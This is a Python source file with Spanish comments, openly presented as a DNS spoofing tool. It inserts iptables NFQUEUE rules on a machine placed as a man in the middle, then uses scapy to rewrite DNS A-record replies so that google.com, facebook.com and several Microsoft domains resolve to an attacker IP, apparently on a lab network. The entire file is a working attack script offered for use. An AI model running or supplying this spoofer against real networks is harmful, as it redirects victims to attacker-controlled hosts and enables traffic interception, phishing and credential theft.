from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
from netfilterqueue import NetfilterQueue
import os

class DNSSpoofer:
    """
    Clase para realizar DNS Spoofing utilizando iptables y NetfilterQueue.

    Atributos:
        targets (dict): Diccionario con dominios (str) y sus direcciones IP falsas.
        queue_num (int): Número de la cola de NetfilterQueue.
        queue (NetfilterQueue): Instancia de NetfilterQueue.
    """

    def __init__(self, targets=None, queue_num=0):
        """
        Inicializa la clase DNSSpoofer con los objetivos y el número de cola.

        Args:
            targets (dict): Diccionario con dominios y sus direcciones IP falsas.
            queue_num (int): Número de la cola de NetfilterQueue.

        Raises:
            ValueError: Si los targets no se proporcionan o no son un diccionario.
        """
        if not targets or not isinstance(targets, dict):
            raise ValueError(
                "Los targets deben ser un diccionario de la forma "
                '{"google.com": "IP_ATACANTE", "www.google.com": "IP_ATACANTE"}'
            )

        # Normalizamos las claves a minúsculas y sin punto final
        self.targets = {
            domain.rstrip(".").lower(): ip
            for domain, ip in targets.items()
        }

        self.queue_num = queue_num

        # Reglas iptables solo para tráfico DNS en la cadena FORWARD
        # IMPORTANTE: esto supone que tu máquina está en medio (router/MITM)
        os.system(
            f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {self.queue_num}"
        )
        os.system(
            f"iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {self.queue_num}"
        )

        self.queue = NetfilterQueue()

    def process_packet(self, packet):
        """
        Procesa cada paquete capturado por la cola de NetfilterQueue.

        Si el paquete contiene una respuesta DNS tipo A para uno de los dominios
        objetivos, se modifica la respuesta.
        """
        scapy_packet = IP(packet.get_payload())

        if not scapy_packet.haslayer(DNS) or not scapy_packet.haslayer(DNSQR):
            packet.accept()
            return

        dns_layer = scapy_packet[DNS]
        query = scapy_packet[DNSQR]

        # Solo nos interesan respuestas (qr = 1)
        if dns_layer.qr != 1:
            packet.accept()
            return

        # Solo nos interesan consultas tipo A (qtype = 1)
        if query.qtype != 1:
            # Puedes descomentar esto para depurar:
            # print("[DEBUG] Consulta no tipo A, qtype:", query.qtype)
            packet.accept()
            return

        qname_bytes = query.qname
        qname = qname_bytes.decode().rstrip(".").lower()

        print(f"[DEBUG] Consulta DNS tipo A detectada: {qname}")

        if qname not in self.targets:
            packet.accept()
            return

        spoof_ip = self.targets[qname]

        # Modificamos la respuesta
        original_summary = scapy_packet.summary()
        scapy_packet = self.modify_packet(scapy_packet, spoof_ip)
        modified_summary = scapy_packet.summary()
        print(f"[Modificado]: {original_summary} -> {modified_summary}")

        packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def modify_packet(self, packet, spoof_ip):
        """
        Modifica el paquete DNS para falsificar la respuesta tipo A.

        Args:
            packet (scapy.Packet): Paquete a modificar.
            spoof_ip (str): IP falsa que se va a inyectar en la respuesta.

        Returns:
            scapy.Packet: Paquete modificado con la respuesta DNS falsificada.
        """
        qname = packet[DNSQR].qname

        # Creamos una respuesta DNS tipo A con la IP indicada
        answer = DNSRR(rrname=qname, rdata=spoof_ip, type=1, rclass=1)

        # Reemplazamos la sección de respuesta
        packet[DNS].an = answer
        packet[DNS].ancount = 1

        # Limpiamos campos para que Scapy recalcule longitudes y checksums
        if packet.haslayer(IP):
            del packet[IP].len
            del packet[IP].chksum
        if packet.haslayer(UDP):
            del packet[UDP].len
            del packet[UDP].chksum

        return packet

    def run(self):
        """
        Inicia el proceso de DNS Spoofing y enlaza la cola de NetfilterQueue.

        Captura interrupciones del teclado para limpiar las reglas de iptables antes
        de salir.
        """
        try:
            print("Inicializando DNS Spoofer...")
            print("Dominios que se van a interceptar:")
            for domain, ip in self.targets.items():
                print(f" - {domain} -> {ip}")

            self.queue.bind(self.queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            print("Deteniendo el proceso de captura y limpiando reglas iptables...")
            os.system(
                f"iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {self.queue_num}"
            )
            os.system(
                f"iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {self.queue_num}"
            )

if __name__ == "__main__":
    # MUY IMPORTANTE:
    # PON AQUI LA IP REAL DE LA MAQUINA ATACANTE QUE LA VICTIMA PUEDE ALCANZAR
    # EJEMPLO: SPOOF_IP = "192.168.64.7"
    SPOOF_IP = "192.168.64.8"

    targets = {
        "google.com": SPOOF_IP,
        "www.google.com": SPOOF_IP,
        "facebook.com": SPOOF_IP,
        "www.facebook.com": SPOOF_IP,
        "edge.microsoft.com": SPOOF_IP,
        "config.edge.skype.com": SPOOF_IP,
        "beacons.gcp.gvt2.com": SPOOF_IP,
        "msedge.b.tlu.dl.delivery.mp.microsoft.com": SPOOF_IP,
        "assets.msn.com": SPOOF_IP,
    }

    dnsspoofer = DNSSpoofer(targets=targets, queue_num=0)
    dnsspoofer.run()